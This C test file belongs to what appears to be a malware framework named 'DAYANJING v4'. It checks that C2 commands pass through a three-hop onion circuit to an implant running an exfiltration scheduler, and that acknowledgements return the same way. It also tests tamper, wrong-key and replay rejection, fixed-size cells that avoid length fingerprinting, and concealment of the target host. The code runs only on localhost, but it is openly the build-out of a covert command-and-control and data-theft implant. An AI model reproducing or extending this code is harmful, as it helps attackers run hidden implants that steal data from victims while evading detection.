/*
 * DAYANJING v4 — test_task_circuit.c
 *
 * C2 命令经**真实洋葱电路**下行、回执上行的端到端验证。
 *
 * ====================================================================
 * 与 test_task 的区别（不要混为一谈）
 * ====================================================================
 * test_task 验证的是「命令 <-> AEAD 报文」这段纯内存转换。
 * 本测试验证的是：
 *   服务端 --(洋葱电路, 3 跳真进程)--> 植入体 --> 回执原路返回
 * 即命令真的走过 socket、真的被中间跳转发、真的在对端落到调度器上，
 * 且回执真的沿同一条电路回来。
 *
 * 拓扑（每一跳都是独立进程，含独立的 mesh 与静态私钥）：
 *   server -> edge0 -> edge1 -> core -> implant
 * core 是最后一跳，剥开自己那层后连最终目标 implant。
 *
 * ====================================================================
 * 验证点
 * ====================================================================
 *  1. 电路建立（3 跳）
 *  2. START 下行 -> 回执 OK，植入体调度器进入 CONTINUOUS
 *  3. SET_CFG 非法配置（max<min）-> 回执 BAD_CFG，且**状态与配置均未变**
 *  4. SET_CFG 合法 -> 回执 OK，配置变更，运行模式不变
 *  5. QUERY -> 回执 OK，不改状态
 *  6. ONCE -> 模式 ONCE；STOP -> 模式 IDLE
 *  7. 篡改取证：翻转报文一个字节 -> 植入体 AUTH（不是静默执行）
 *  8. 错密钥取证：用非会话密钥封命令 -> 植入体 AUTH
 *  9. 重放取证：原样重发一条已接受的命令 -> 植入体 REPLAY
 *     （c2_frame 把 IV 放线上、不跟踪计数器，重放防护只能靠本层 seq）
 * 10. 洋葱取证：洋葱字节不含最终目标主机名、不含深跳 ID 明文
 * 11. 边界：声明长度超限 -> 接收端 LEN 拒绝（不按声明值分配）
 */

#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_sched.h"
#include "p2p.h"
#include "c2_frame.h"
#include "crypto_x25519.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int pass = 0, fail = 0;
#define CK(c, m) do { if (c) { pass++; printf("[PASS] %s\n", m); } \
                      else { fail++; printf("[FAIL] %s\n", m); } } while (0)

/* 测试用固定密钥材料（真实部署走 02_c2 会话派生） */
static const uint8_t K_A[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
static const uint8_t K_B[16] = { 16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 };
static const uint8_t K_X[16] = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x11,0x22,
                                 0x33,0x44,0x55,0x66,0x77,0x88,0x99,0x00 };
static const uint8_t PFX[8]  = { 0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8 };

/* 植入体经管道报给父进程的判定结果 */
typedef struct {
    int      rc;             /* recv_cmd 的返回值 */
    uint64_t seq;
    uint8_t  opcode;
    uint8_t  status;         /* 回执里的 status（rc != OK 时无意义）*/
    uint64_t task_id;
    uint32_t mode;           /* 执行后的调度器模式 */
    uint64_t frames_sent;
    uint32_t window_frames;
    uint64_t window_bytes;
    /* 执行后的配置，用于验证"非法配置不生效" */
    uint64_t min_us, max_us;
    uint32_t burst_max;
} implant_res_t;

static void set_id(uint8_t *id, const char *s)
{
    memset(id, 0, P2P_NODE_ID_LEN);
    memcpy(id, s, strlen(s) > P2P_NODE_ID_LEN ? P2P_NODE_ID_LEN : strlen(s));
}

static int listen_auto(int *out_port)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int on = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    if (listen(s, 8) < 0) { close(s); return -1; }
    struct sockaddr_in got; socklen_t gl = sizeof got;
    if (getsockname(s, (struct sockaddr *)&got, &gl) < 0) { close(s); return -1; }
    *out_port = ntohs(got.sin_port);
    return s;
}

/*
 * 植入体进程：接受电路连接，循环收命令 -> 落到调度器 -> 回执。
 * 每轮把结果经管道报给父进程（父进程做断言，子进程只报告）。
 */
static pid_t spawn_implant(int *port, int rpfd, int n_cmds)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);

        /* 植入体侧：ks=K_B, kr=K_A（与服务端互补） */
        exfil_task_chan_t ch;
        if (exfil_task_chan_init(&ch, K_B, K_A, PFX) != EXF_TASK_OK) _exit(5);

        exfil_sched_t sch;
        if (exfil_sched_init(&sch, NULL, 0x1234abcd5678ef01ULL) != EXF_SCHED_OK)
            _exit(6);

        for (int i = 0; i < n_cmds; i++) {
            exfil_task_cmd_t cmd;
            uint64_t seq = 0;
            memset(&cmd, 0, sizeof cmd);

            int rc = exfil_task_chan_recv_cmd(&ch, cfd, &seq, &cmd);

            implant_res_t res;
            memset(&res, 0, sizeof res);
            res.rc   = rc;
            res.seq  = seq;
            res.mode = (uint32_t)sch.mode;
            res.frames_sent  = sch.frames_sent;
            res.window_frames = sch.window_frames;
            res.window_bytes = sch.window_bytes;
            res.min_us    = sch.cfg.min_interval_us;
            res.max_us    = sch.cfg.max_interval_us;
            res.burst_max = sch.cfg.burst_max;

            if (rc == EXF_TASK_OK) {
                int ar = exfil_task_apply(&sch, &cmd);
                uint8_t st = (ar == EXF_TASK_OK)      ? EXF_TASK_ST_OK
                           : (ar == EXF_TASK_ERR_CFG) ? EXF_TASK_ST_BAD_CFG
                           :                            EXF_TASK_ST_UNKNOWN;

                exfil_task_ack_t ack;
                memset(&ack, 0, sizeof ack);
                if (exfil_task_fill_ack(&sch, &cmd, st, &ack) != EXF_TASK_OK)
                    _exit(7);

                res.opcode  = cmd.opcode;
                res.status  = st;
                res.task_id = cmd.task_id;
                res.mode    = (uint32_t)sch.mode;
                res.min_us    = sch.cfg.min_interval_us;
                res.max_us    = sch.cfg.max_interval_us;
                res.burst_max = sch.cfg.burst_max;

                if (exfil_task_chan_ack(&ch, cfd, seq, &ack) != EXF_TASK_OK)
                    _exit(8);
            }
            if (write(pfd[1], &res, sizeof res) != (ssize_t)sizeof res) break;
        }
        exfil_sched_wipe(&sch);
        exfil_task_chan_wipe(&ch);
        close(cfd); close(s); close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    dup2(pfd[0], rpfd);
    close(pfd[0]);
    *port = lp;
    return pid;
}

static pid_t spawn_onion_node(const p2p_mesh_t *m, const uint8_t *my_id,
                              const uint8_t sk[P2P_ONION_SK_LEN], int *port)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);
        p2p_onion_route_serve(m, my_id, sk, s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *port = lp;
    return pid;
}

static int read_res(int rpfd, implant_res_t *out)
{
    return read(rpfd, out, sizeof *out) == (ssize_t)sizeof *out ? 0 : -1;
}

static int contains(const uint8_t *hay, size_t n, const uint8_t *ndl, size_t m)
{
    if (m == 0 || n < m) return 0;
    for (size_t i = 0; i + m <= n; i++)
        if (memcmp(hay + i, ndl, m) == 0) return 1;
    return 0;
}

/* 造一条命令 */
static void mk_cmd(exfil_task_cmd_t *c, uint8_t op, uint64_t tid)
{
    memset(c, 0, sizeof *c);
    c->opcode  = op;
    c->task_id = tid;
}

/* ---- 手工构造 payload（绕过本地 API 校验）----
 *
 * 用例3 必须用这个：exfil_task_encode_cmd 会在编码阶段就拒绝非法配置
 * （返回 EXF_TASK_ERR_CFG），因此"非法配置"只能以伪造字节的形式到达
 * 植入体。这正是要验的东西 —— 植入体的校验不能只存在于本地 API 里，
 * 否则任何绕过 API 直接组包者（或被劫持通道里的重放/构造报文）都能
 * 把调度器写进 max<min 的死状态。
 */

static void put_u64(uint8_t *p, uint64_t v)
{
    for (int i = 0; i < 8; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xff);
}

static void put_u32(uint8_t *p, uint32_t v)
{
    for (int i = 0; i < 4; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xff);
}

static int seal_raw_cmd(const uint8_t key[16], const uint8_t pfx[8],
                        uint32_t ctr, uint64_t seq,
                        uint8_t opcode, uint64_t tid,
                        uint64_t min_us, uint64_t max_us, uint32_t burst,
                        uint64_t win_us, uint32_t wf, uint64_t wb, int dedup,
                        uint8_t *wire, size_t cap, size_t *wlen)
{
    uint8_t pl[EXF_TASK_CMD_LEN];
    memset(pl, 0, sizeof pl);
    pl[0]  = opcode;
    pl[1]  = 0;            /* flags */
    pl[2]  = 0; pl[3] = 0; /* rsv   */
    put_u64(pl + 4,  tid);
    put_u64(pl + 12, min_us);
    put_u64(pl + 20, max_us);
    put_u32(pl + 28, burst);
    put_u64(pl + 32, win_us);
    put_u32(pl + 40, wf);
    put_u64(pl + 44, wb);
    pl[52] = dedup ? 1 : 0;
    /* pl[53..55] pad 保持 0 */

    return c2_frame_seal(key, pfx, ctr, seq, EXF_MSG_TASK,
                         pl, sizeof pl, wire, cap, wlen);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== 21_exfil 命令经真实洋葱电路下行（真进程 + 真 socket） ===\n");
    signal(SIGPIPE, SIG_IGN);

    uint8_t ID_SV[P2P_NODE_ID_LEN], ID_E0[P2P_NODE_ID_LEN],
            ID_E1[P2P_NODE_ID_LEN], ID_CORE[P2P_NODE_ID_LEN];
    set_id(ID_SV, "SERVER"); set_id(ID_E0, "EDGE0");
    set_id(ID_E1, "EDGE1");  set_id(ID_CORE, "CORE");

    uint8_t sk_e0[32], pk_e0[32], sk_e1[32], pk_e1[32], sk_core[32], pk_core[32];
    CK(x25519_generate_keypair(sk_e0, pk_e0) == X25519_OK, "edge0 生成静态密钥对");
    CK(x25519_generate_keypair(sk_e1, pk_e1) == X25519_OK, "edge1 生成静态密钥对");
    CK(x25519_generate_keypair(sk_core, pk_core) == X25519_OK, "core 生成静态密钥对");

    p2p_mesh_t m_core; p2p_mesh_init(&m_core);
    p2p_node_add(&m_core, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", 0);
    int p_core = 0;
    pid_t pid_core = spawn_onion_node(&m_core, ID_CORE, sk_core, &p_core);
    CK(pid_core > 0 && p_core > 0, "core 节点启动");

    p2p_mesh_t m_e1; p2p_mesh_init(&m_e1);
    p2p_node_add(&m_e1, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", 0);
    p2p_node_add(&m_e1, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_neighbor_link(&m_e1, ID_E1, ID_CORE);
    int p_e1 = 0;
    pid_t pid_e1 = spawn_onion_node(&m_e1, ID_E1, sk_e1, &p_e1);
    CK(pid_e1 > 0 && p_e1 > 0, "edge1 节点启动");

    p2p_mesh_t m_e0; p2p_mesh_init(&m_e0);
    p2p_node_add(&m_e0, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", 0);
    p2p_node_add(&m_e0, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_neighbor_link(&m_e0, ID_E0, ID_E1);
    int p_e0 = 0;
    pid_t pid_e0 = spawn_onion_node(&m_e0, ID_E0, sk_e0, &p_e0);
    CK(pid_e0 > 0 && p_e0 > 0, "edge0 节点启动");

    p2p_mesh_t m_sv; p2p_mesh_init(&m_sv);
    p2p_node_add(&m_sv, ID_SV, P2P_ROLE_ENDPOINT, "server", "127.0.0.1", 0);
    p2p_node_add(&m_sv, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", (uint16_t)p_e0);
    p2p_node_add(&m_sv, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_node_add(&m_sv, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_node_set_pub(&m_sv, ID_E0, pk_e0);
    p2p_node_set_pub(&m_sv, ID_E1, pk_e1);
    p2p_node_set_pub(&m_sv, ID_CORE, pk_core);
    p2p_neighbor_link(&m_sv, ID_SV, ID_E0);
    p2p_neighbor_link(&m_sv, ID_E0, ID_E1);
    p2p_neighbor_link(&m_sv, ID_E1, ID_CORE);

    /* 命令序列：7 条正常 + 1 篡改 + 1 错密钥 + 1 正常 + 1 重发 = 11 轮 */
    int rp = dup(0);
    int ip = 0, fd = -1;
    pid_t pid_i = spawn_implant(&ip, rp, 11);
    CK(pid_i > 0 && ip > 0, "植入体进程启动");

    exfil_task_chan_t sv;
    CK(exfil_task_chan_init(&sv, K_A, K_B, PFX) == EXF_TASK_OK,
       "服务端任务通道初始化");

    uint8_t salt[P2P_ONION_SALT_LEN];
    for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x40);

    int rc = p2p_onion_route_open(&m_sv, ID_SV, ID_CORE,
                                  "127.0.0.1", (uint16_t)ip, salt, &fd);
    CK(rc == P2P_OK && fd >= 0, "洋葱电路建立（3 跳）");
    if (fd < 0) goto done;

    /* ---- 用例2：START ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 1001);
        CK(exfil_task_chan_cmd(&sv, fd, 1, &c) == EXF_TASK_OK, "用例2 命令写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例2 读到植入体报告");
        CK(r.rc == EXF_TASK_OK, "用例2 命令被接受");
        CK(r.opcode == EXF_TASK_OP_START, "用例2 操作码一致");
        CK(r.status == EXF_TASK_ST_OK, "用例2 回执状态 OK");
        CK(r.task_id == 1001, "用例2 task_id 一致");
        CK(r.mode == EXF_SCHED_MODE_CONTINUOUS, "用例2 调度器进入 CONTINUOUS");
        exfil_task_ack_t a; uint64_t as = 0;
        CK(exfil_task_chan_recv_ack(&sv, fd, &as, &a) == EXF_TASK_OK, "用例2 回执经电路返回");
        CK(a.task_id == 1001 && a.status == EXF_TASK_ST_OK, "用例2 回执内容一致");
        CK(a.mode == EXF_SCHED_MODE_CONTINUOUS, "用例2 回执模式一致");
    }

    /* ---- 用例3：SET_CFG 非法（max < min），以伪造字节下发 ---- */
    {
        uint8_t wire[P2P_CELL_DATA_MAX];
        size_t  wlen = 0;
        CK(seal_raw_cmd(sv.ks, sv.pfx_frame, sv.cell.send_counter, 2,
                        EXF_TASK_OP_SET_CFG, 1002,
                        5000000, 1000000,   /* max < min，非法 */
                        8, 60000000, 4, 1u << 20, 1,
                        wire, sizeof wire, &wlen) == C2_FRAME_OK,
           "用例3 手工封非法配置命令");
        CK(exfil_task_chan_send_raw(&sv, fd, wire, wlen) == EXF_TASK_OK, "用例3 命令写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例3 读到植入体报告");
        CK(r.rc == EXF_TASK_OK, "用例3 命令被接受（报文本身合法）");
        CK(r.status == EXF_TASK_ST_BAD_CFG, "用例3 回执 BAD_CFG");
        CK(r.mode == EXF_SCHED_MODE_CONTINUOUS, "用例3 运行模式未变");
        CK(r.min_us == 1000000 && r.max_us == 2000000,
           "用例3 配置未被写入（仍是默认 1s/2s）");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK, "用例3 回执经电路返回");
        CK(a.status == EXF_TASK_ST_BAD_CFG, "用例3 回执状态一致");
    }

    /* ---- 用例4：SET_CFG 合法 ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_SET_CFG, 1003);
        c.cfg.min_interval_us   = 2000000;
        c.cfg.max_interval_us   = 4000000;
        c.cfg.burst_max         = 16;
        c.cfg.window_us         = 30000000;
        c.cfg.window_max_frames = 6;
        c.cfg.window_max_bytes  = 4u << 20;
        c.cfg.dedup             = 1;
        CK(exfil_task_chan_cmd(&sv, fd, 3, &c) == EXF_TASK_OK, "用例4 命令写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例4 读到植入体报告");
        CK(r.status == EXF_TASK_ST_OK, "用例4 回执 OK");
        CK(r.min_us == 2000000 && r.max_us == 4000000, "用例4 配置已生效");
        CK(r.burst_max == 16, "用例4 burst_max 已生效");
        CK(r.mode == EXF_SCHED_MODE_CONTINUOUS, "用例4 运行模式不变（SET_CFG 不改模式）");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK, "用例4 回执经电路返回");
    }

    /* ---- 用例5：QUERY ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_QUERY, 1004);
        CK(exfil_task_chan_cmd(&sv, fd, 4, &c) == EXF_TASK_OK, "用例5 命令写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例5 读到植入体报告");
        CK(r.status == EXF_TASK_ST_OK, "用例5 回执 OK");
        CK(r.mode == EXF_SCHED_MODE_CONTINUOUS, "用例5 QUERY 不改状态");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK, "用例5 回执经电路返回");
        CK(a.task_id == 1004, "用例5 回执 task_id 一致");
    }

    /* ---- 用例6：ONCE 然后 STOP ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_ONCE, 1005);
        CK(exfil_task_chan_cmd(&sv, fd, 5, &c) == EXF_TASK_OK, "用例6 ONCE 写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例6 读到植入体报告");
        CK(r.mode == EXF_SCHED_MODE_ONCE, "用例6 模式 ONCE");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK, "用例6 ONCE 回执返回");

        exfil_task_cmd_t c2; mk_cmd(&c2, EXF_TASK_OP_STOP, 1006);
        CK(exfil_task_chan_cmd(&sv, fd, 6, &c2) == EXF_TASK_OK, "用例6 STOP 写入电路");
        implant_res_t r2;
        CK(read_res(rp, &r2) == 0, "用例6 读到 STOP 报告");
        CK(r2.mode == EXF_SCHED_MODE_IDLE, "用例6 模式 IDLE");
        exfil_task_ack_t a2;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a2) == EXF_TASK_OK, "用例6 STOP 回执返回");
    }

    /* ---- 用例7：篡改取证 ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 1007);
        uint8_t wire[P2P_CELL_DATA_MAX];
        size_t wlen = 0;
        CK(exfil_task_seal_cmd(sv.ks, sv.pfx_frame, sv.cell.send_counter, 7, &c,
                               wire, sizeof wire, &wlen) == EXF_TASK_OK,
           "用例7 手工封命令");
        wire[wlen - 1] ^= 0x01;                       /* 翻转最后一个字节（tag 内）*/
        CK(exfil_task_chan_send_raw(&sv, fd, wire, wlen) == EXF_TASK_OK, "用例7 篡改报文写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例7 读到植入体报告");
        printf("[INFO] 用例7 植入体 rc=%d (%s)\n", r.rc, exfil_task_errstr(r.rc));
        CK(r.rc == EXF_TASK_ERR_AUTH, "用例7 篡改被 AEAD 拒绝（非静默执行）");
        CK(r.mode == EXF_SCHED_MODE_IDLE, "用例7 模式未被篡改命令改变");
    }

    /* ---- 用例8：错密钥取证 ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 1008);
        uint8_t wire[P2P_CELL_DATA_MAX];
        size_t wlen = 0;
        CK(exfil_task_seal_cmd(K_X, sv.pfx_frame, sv.cell.send_counter, 8, &c,
                               wire, sizeof wire, &wlen) == EXF_TASK_OK,
           "用例8 用非会话密钥封命令");
        CK(exfil_task_chan_send_raw(&sv, fd, wire, wlen) == EXF_TASK_OK, "用例8 报文写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例8 读到植入体报告");
        printf("[INFO] 用例8 植入体 rc=%d (%s)\n", r.rc, exfil_task_errstr(r.rc));
        CK(r.rc == EXF_TASK_ERR_AUTH, "用例8 非会话密钥被拒绝");
    }

    /* ---- 用例9：重放取证 ---- */
    {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_QUERY, 1009);
        uint8_t wire[P2P_CELL_DATA_MAX];
        size_t wlen = 0;
        CK(exfil_task_seal_cmd(sv.ks, sv.pfx_frame, sv.cell.send_counter, 9, &c,
                               wire, sizeof wire, &wlen) == EXF_TASK_OK,
           "用例9 封合法命令");
        CK(exfil_task_chan_send_raw(&sv, fd, wire, wlen) == EXF_TASK_OK, "用例9 报文写入电路");
        implant_res_t r;
        CK(read_res(rp, &r) == 0, "用例9 读到植入体报告");
        CK(r.rc == EXF_TASK_OK, "用例9 首次被接受");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK, "用例9 回执返回");

        /* 原样重发 —— c2_frame 不跟踪计数器，只能靠本层 seq 拦截 */
        CK(exfil_task_chan_send_raw(&sv, fd, wire, wlen) == EXF_TASK_OK, "用例9 原样重发");
        implant_res_t r2;
        CK(read_res(rp, &r2) == 0, "用例9 读到重放报告");
        printf("[INFO] 用例9 重放 rc=%d (%s)\n", r2.rc, exfil_task_errstr(r2.rc));
        CK(r2.rc == EXF_TASK_ERR_REPLAY, "用例9 重放被 seq 单调性拦截");
    }

    /* ---- 用例11：恒定长度（原"声明长度"攻击面已随长度前缀一起消失）---- */
    {
        int sp[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) == 0) {
            exfil_task_chan_t t;
            uint8_t  wire[P2P_CELL_DATA_MAX];
            uint8_t  buf[P2P_CELL_WIRE * 2];
            size_t   wlen = 0;
            size_t   n1 = 0, n2 = 0;

            CK(exfil_task_chan_init(&t, K_A, K_B, PFX) == EXF_TASK_OK,
               "用例11 旁路通道初始化");

            exfil_task_cmd_t c11; exfil_task_ack_t a11;
            memset(&c11, 0, sizeof c11);
            memset(&a11, 0, sizeof a11);
            c11.opcode = EXF_TASK_OP_START; c11.task_id = 2001;
            a11.opcode = EXF_TASK_OP_START; a11.status  = EXF_TASK_ST_OK;
            a11.task_id = 2001;

            CK(exfil_task_seal_cmd(t.ks, t.pfx_frame, t.cell.send_counter, 1,
                                   &c11, wire, sizeof wire, &wlen) == EXF_TASK_OK,
               "用例11 旁路封命令");
            printf("[INFO] 用例11 内层命令报文=%zu 字节\n", wlen);
            CK(exfil_task_chan_send_raw(&t, sp[0], wire, wlen) == EXF_TASK_OK,
               "用例11 命令写入旁路");
            { size_t got = 0;
              while (got < P2P_CELL_WIRE) {
                  ssize_t r = read(sp[1], buf + got, P2P_CELL_WIRE - got);
                  if (r <= 0) break;
                  got += (size_t)r;
              }
              n1 = got; }

            CK(exfil_task_seal_ack(t.ks, t.pfx_frame, t.cell.send_counter, 1,
                                   &a11, wire, sizeof wire, &wlen) == EXF_TASK_OK,
               "用例11 旁路封回执");
            printf("[INFO] 用例11 内层回执报文=%zu 字节\n", wlen);
            CK(exfil_task_chan_send_raw(&t, sp[0], wire, wlen) == EXF_TASK_OK,
               "用例11 回执写入旁路");
            { size_t got = 0;
              while (got < P2P_CELL_WIRE) {
                  ssize_t r = read(sp[1], buf + got, P2P_CELL_WIRE - got);
                  if (r <= 0) break;
                  got += (size_t)r;
              }
              n2 = got; }

            CK(n1 == P2P_CELL_WIRE, "用例11 命令线上恒 512 字节");
            CK(n2 == P2P_CELL_WIRE, "用例11 回执线上恒 512 字节");
            CK(n1 == n2, "用例11 命令与回执长度不可区分（无长度指纹）");
            exfil_task_chan_wipe(&t);
            close(sp[0]); close(sp[1]);
        }
    }

    /* ---- 用例12：方向密钥不退化（IV 重用回归守卫）----
     *
     * 早期版本把回执写成"用 kr 封、用 ks 解"，两端一折算，下行与上行
     * 用的是同一把密钥；再叠加两方向计数器各自从 0 起、共用同一 pfx，
     * 于是第一条命令与第一条回执在**同一密钥下 IV 完全相同** ——
     * 两条密文异或即抵消密钥流，泄露明文异或（GCM 致命误用）。
     *
     * 本用例直接从密文侧取证：同一 pfx、同一 counter=0 下，
     * 下行与上行密文的密钥流前缀必须不同。若退化成同一密钥，
     * 前若干字节会逐字节相同，此断言即失败。
     */
    {
        exfil_task_cmd_t c12; exfil_task_ack_t a12;
        uint8_t w_cmd[512], w_ack[512];
        size_t n_cmd = 0, n_ack = 0;
        memset(&c12, 0, sizeof c12);
        memset(&a12, 0, sizeof a12);
        c12.opcode = EXF_TASK_OP_START; c12.task_id = 3001;
        a12.opcode = EXF_TASK_OP_START; a12.status  = EXF_TASK_ST_OK;
        a12.task_id = 3001;

        /* 服务端视角：下行用 ks 封，上行（回执）对端用 kr 封 */
        CK(exfil_task_seal_cmd(sv.ks, sv.pfx_frame, 0, 1, &c12,
                               w_cmd, sizeof w_cmd, &n_cmd) == EXF_TASK_OK,
           "用例12 封下行命令");
        CK(exfil_task_seal_ack(sv.kr, sv.pfx_frame, 0, 1, &a12,
                               w_ack, sizeof w_ack, &n_ack) == EXF_TASK_OK,
           "用例12 封上行回执");
        printf("[INFO] 用例12 下行=%zu 上行=%zu 字节\n", n_cmd, n_ack);

        CK(memcmp(sv.ks, sv.kr, 16) != 0, "用例12 方向密钥本身不相等");
        /* 密文区起始偏移：len(4) + msg_type(4) + pfx(8) + counter(4) = 20 */
        CK(n_cmd > 32 && n_ack > 32, "用例12 报文长度足以取密钥流样本");
        CK(memcmp(w_cmd + 20, w_ack + 20, 12) != 0,
           "用例12 两方向密钥流不同（无 IV 重用）");
    }

    close(fd);

    /* ---- 用例10：洋葱取证 ---- */
    {
        uint8_t hops[3 * P2P_NODE_ID_LEN];
        memcpy(hops + 0 * P2P_NODE_ID_LEN, ID_E0, P2P_NODE_ID_LEN);
        memcpy(hops + 1 * P2P_NODE_ID_LEN, ID_E1, P2P_NODE_ID_LEN);
        memcpy(hops + 2 * P2P_NODE_ID_LEN, ID_CORE, P2P_NODE_ID_LEN);
        uint8_t pubs[3 * P2P_PUBKEY_LEN];
        memcpy(pubs + 0 * P2P_PUBKEY_LEN, pk_e0, P2P_PUBKEY_LEN);
        memcpy(pubs + 1 * P2P_PUBKEY_LEN, pk_e1, P2P_PUBKEY_LEN);
        memcpy(pubs + 2 * P2P_PUBKEY_LEN, pk_core, P2P_PUBKEY_LEN);

        uint8_t onion[4096];
        size_t olen = 0;
        int r = p2p_onion_build(hops, 3, pubs, salt, "SECRETTARGETHOST", 9999,
                                onion, sizeof onion, &olen);
        CK(r == P2P_ONION_OK && olen > 0, "用例10 洋葱构建成功");
        if (r == P2P_ONION_OK) {
            printf("[INFO] 用例10 洋葱长度=%zu\n", olen);
            CK(!contains(onion, olen, (const uint8_t *)"SECRETTARGETHOST", 16),
               "用例10 洋葱不含最终目标主机名");
            CK(!contains(onion, olen, ID_CORE, P2P_NODE_ID_LEN),
               "用例10 洋葱不含深跳(core) ID 明文");
        }
    }

done:
    exfil_task_chan_wipe(&sv);
    kill(pid_i, SIGKILL); waitpid(pid_i, NULL, 0);
    kill(pid_e0, SIGKILL); waitpid(pid_e0, NULL, 0);
    kill(pid_e1, SIGKILL); waitpid(pid_e1, NULL, 0);
    kill(pid_core, SIGKILL); waitpid(pid_core, NULL, 0);
    close(rp);

    printf("\n=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
